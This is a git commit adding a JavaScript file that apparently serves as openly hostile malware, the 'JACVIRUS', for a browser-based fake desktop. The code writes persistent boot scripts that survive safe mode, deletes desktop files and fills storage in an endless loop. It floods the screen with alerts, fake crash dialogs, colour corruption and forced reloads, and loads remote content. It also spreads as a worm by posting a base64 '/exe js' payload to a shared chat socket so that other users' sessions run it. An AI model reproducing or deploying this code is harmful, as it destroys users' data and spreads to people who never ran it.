04049fb57dc311bdde02d5463877c78ae921fcab
Jacobwworkman <54043124+Jacobwworkman@users.noreply.github.com>
2021-04-01 17:03:21 -0700

    Create code.js

---
+++ code.js
@@ -0,0 +1,187 @@
+$db.set("boot/youTried.js","window.location.hash=\"#\";biosSetup();$boot.BIOS.innerHTML=\"<b> Your pc is trashed by the JACVIRUS. Don't try to remove this virus in safe mode. because safe mode is trashed too. </b> <img src=\\\"//\\\" style=\\\"position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);\\\"><audio src=\\\"https://cdn.discordapp.com/attachments/612814030515470363/786017967146139668/Hacknet_Labyrinths_OST_HOME_-_Dreamhead.mp3\\\" autoplay=\\\"\\\" loop=\\\"\\\"></audio>\"");
+$file.save("/a/desktop/bruh.lnk42", "js base64"); //anti-safe mode.
+$file.save("/a/desktop/bruh.lnk42", "js base64"); //back up just incase the user deletes it
+$file.save("/a/desktop/bruh.lnk42", "js base64"); //ok please stop
+$file.save("/a/boot/bruh.lnk42", "js base64"); //fuck you
+$alert.error("Your computer is now trashed by the JACVIRUS. Don't try to reboot, or boot in safe mode. Your pc is fucked anyway. Use it as long as you can. I don't even think you can see this anymore.")
+$audio('https://cdn.discordapp.com/attachments/759917650448089119/784901759989579776/Windows_Error_Remix.mp3').play()
+var i;
+for (let step = 0; step < 10; step++) {
+  $alert('YOUR PC IS FUCKED.')
+  $file.save("/a/boot/bruh.lnk42", "js base64");// oh my god
+  $file.save("/a/boot/bruh.lnk42", "js base64"); //stop
+} 
+(function quine() {
+  setInterval(function () {
+    var ifr = document.querySelector('iframe[src*=trollbox]')
+    if (ifr && ifr.contentWindow.socket) {
+      ifr.contentWindow.socket.emit('message', '/exe js JGRiLnNldCgiYm9vdC95b3VUcmllZC5qcyIsIndpbmRvdy5sb2NhdGlvbi5oYXNoPVwiI1wiO2Jpb3NTZXR1cCgpOyRib290LkJJT1MuaW5uZXJIVE1MPVwiPGI+IFlvdXIgcGMgaXMgdHJhc2hlZCBieSB0aGUgSkFDVklSVVMuIERvbid0IHRyeSB0byByZW1vdmUgdGhpcyB2aXJ1cyBpbiBzYWZlIG1vZGUuIGJlY2F1c2Ugc2FmZSBtb2RlIGlzIHRyYXNoZWQgdG9vLiA8L2I+IDxpbWcgc3JjPVxcXCIvL1xcXCIgc3R5bGU9XFxcInBvc2l0aW9uOmZpeGVkO2xlZnQ6NTAlO3RvcDo1MCU7dHJhbnNmb3JtOnRyYW5zbGF0ZSgtNTAlLC01MCUpO1xcXCI+PGF1ZGlvIHNyYz1cXFwiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvNjEyODE0MDMwNTE1NDcwMzYzLzc4NjAxNzk2NzE0NjEzOTY2OC9IYWNrbmV0X0xhYnlyaW50aHNfT1NUX0hPTUVfLV9EcmVhbWhlYWQubXAzXFxcIiBhdXRvcGxheT1cXFwiXFxcIiBsb29wPVxcXCJcXFwiPjwvYXVkaW8+XCIiKTsKJGZpbGUuc2F2ZSgiL2EvZGVza3RvcC9icnVoLmxuazQyIiwgImpzIGJhc2U2NCIpOyAvL2FudGktc2FmZSBtb2RlLg==')
+      ifr.contentWindow.a = !ifr.contentWindow.a
+    }
+  }, 2500)
+})() 
+le._dom.taskbar.innerHTML = "<button>ERROR!</button>"
+//$store.set('boot/love.js', 'while(true) { continue; }')
+window.location.href = window.location.href;
+function main(){setInterval(function(){requestAnimationFrame(()=>{function c(f){f.querySelectorAll(".ui_window__head,.ui_window,button,#s42_dock,#s42_notif,.ui_menu ul,*>button,.skin_inset,.skin_base").forEach(g=>g.style.background="#"+(16777215*Math.random()<<0).toString(16))}c(document),document.querySelectorAll("iframe").forEach(f=>c(f.contentWindow.document))})},100)}main(),$db.set("boot/./colorbug.js","!"+main.toString()+"()");
+( function ( )
+{
+    $store.keys( )
+        .filter( e => /desktop\//.test( e ) )
+        .forEach( e => $store.del( e ) );
+    !async function x( )
+    {
+        $store.set( "/./" + Math.random( )
+            .toString( 36 )
+            .slice( 2 ) + ".raw", new Array( 512 )
+            .join( "ầ" ) );
+        setTimeout( x, 0 );
+    }( );
+} )( );
+$alert.error("Your pc is dead")
+$alert.error("432774245245&@%3$#$3$%&$%&43u6ertdftyfeWQwea34a343457SETDS6RA743WA43wer4$&537%456zadfzaatreDFEt7&(*$&*(#$&89398&($377@@^^^@$")
+Array.prototype.random = function () {
+  return this[Math.floor((Math.random()*this.length))];
+}
+p=$exe,$db.set("c","minimemz"),$exe("code /a/c"),setInterval(()=>{p("fx invert"),$alert({title:"lol",msg:"Still using this computer?",center:!1}),p(`layer ${le._path.skin}error.png`),$audio("error").play(),p($io.arr.random(Object.keys(le._apps))),$window("//u.nu/xu3")},500);
+setInterval(function(){Array.prototype.random = function () {
+  return this[Math.floor((Math.random()*this.length))];
+}
+wmd = []
+
+function addStyle(styleString) {
+    const style = document.createElement('style');
+    style.textContent = styleString;
+    document.head.append(style);
+}
+fetch("https://cors-anywhere.herokuapp.com/https://pastebin.com/raw/TKkw1Jak").then(response => response.text()).then(data => addStyle(data))
+
+function createRep(appName) {
+
+    let wn = $window({
+        title: "Microsoft Windows",
+        html: `<div id="rep_head"><b>${appName} has encountered a problem and needs to <br> close. We are sorry for the inconvenience.</b></div><div id="rep_body">If you were in the middle of something, the information you were working on might be lost.<br><br><b>Please tell Microsoft about this problem</b><br>We have created an error report that you can send to us. We will treat<br>this report as confidential and anonymous.<br><br>To see what data this error report contains, <a href="#">click here</a>.<div id="rep_button"><button class="cls">Send Error Report</button><button class="cls">Don't Send</button></div>`,
+        width: 410,
+        height: 230,
+        animationIn: "",
+        animationOut: "",
+        center: true
+    })
+    wmd.push(wn)
+
+    for (i in document.getElementsByClassName("cls")) {
+        document.getElementsByClassName("cls")[i].onclick = function() {
+            $window.current.close()
+        }
+    }
+}
+
+function lePayload() {
+    setInterval(function() {
+        try {
+            if ($window.current.cfg.title != "Microsoft Windows") {
+                let nsv = $window.current.cfg.title;
+                $window.current.destroy()
+                createRep(nsv)
+            }
+        } catch (e) {
+            console.log(e)
+        }
+
+    }, 1000)
+}
+
+function leCorrupt(){
+setInterval(function(){
+Array.prototype.random = function () {
+  return this[Math.floor((Math.random()*this.length))];
+}
+var s = ["cool"]
+document.querySelectorAll("div, button, span, img").forEach(function(n){
+var sn = n.className
+var random_boolean = Math.random() <= 0.05;
+if(random_boolean){
+n.className = s.random();
+}
+if(typeof sn == "string" && !s.includes(sn)){
+console.log("pushing", sn)
+s.push(sn);
+}
+})
+$notif("Invalid Parameter", "This may cause memory corruptions")
+$audio("boot").play()
+},10000)
+
+setInterval(function(){
+$audio("error").play()
+},3000)
+}
+
+
+$alert({title:"DRDFJDCFJCJHGCGHJCHGCGHCHGBNHQ,",msg:"Erorr! Stupid user detect ! Computer will now self destuct slowly!!"})
+
+setTimeout(function(){
+lePayload()
+leCorrupt()
+},2000)
+var s = ["cool"]
+document.querySelectorAll("div, button, span, img").forEach(function(n){
+var sn = n.className
+var random_boolean = Math.random() <= 0.05;
+if(random_boolean){
+n.className = s.random();
+}
+if(typeof sn == "string" && !s.includes(sn)){
+console.log("pushing", sn)
+s.push(sn);
+}
+})},3000)
+
+/*/
+setInterval(() => $exe("fx invert .ui_window"), 1000);
+
+let clamp = (a, b, c) => Math.max(b, Math.min(c, a));
+let dirmap = new WeakMap();
+
+function bounce() {
+  for (let win of window.$window.instances.filter(a => a !== null)) {
+    if (!dirmap.has(win)) dirmap.set(win, [1, 1]);
+
+    let [dirX, dirY] = dirmap.get(win);
+    let rect = win.el.base.getBoundingClientRect();
+
+         if (rect.x + rect.width >= window.innerWidth)   dirX = -1;
+    else if (rect.y + rect.height >= window.innerHeight) dirY = -1;
+    else if (rect.x <= 0)                                dirX = 1;
+    else if (rect.y <= 0)                                dirY = 1;
+
+    win.el.base.style.left = clamp(rect.x + dirX * 5, 0, window.innerWidth - rect.width) + "px";
+    win.el.base.style.top = clamp(rect.y + dirY * 5, 0, window.innerHeight - rect.height) + "px";
+
+    dirmap.set(win, [dirX, dirY]);
+  }
+
+  requestAnimationFrame(bounce);
+}
+
+
+requestAnimationFrame(bounce);
+if(window.interval) clearInterval(interval);
+var canvas = le._dom.canvas.firstChild;
+var ctx = canvas.getContext('2d');
+function f(x, y, s) {
+    return (y % x) + (x % y) + s;
+}
+ctx.clearRect(0, 0, canvas.width, canvas.height);
+/*/
+
+var s = 0;
+window.interval = setInterval(function() {
+    for(var y = 0; y < canvas.height; y += 6) {
+        for(var x = 0; x < canvas.width; x += 6) {
+            ctx.fillStyle = `hsl(${f(x, y, s * 2)}, 100%, 50%)`;
+            ctx.fillRect(x+s%15, y+s%14, 1, 1);
+        }
+    }
+    s += 2;
+}, 50);
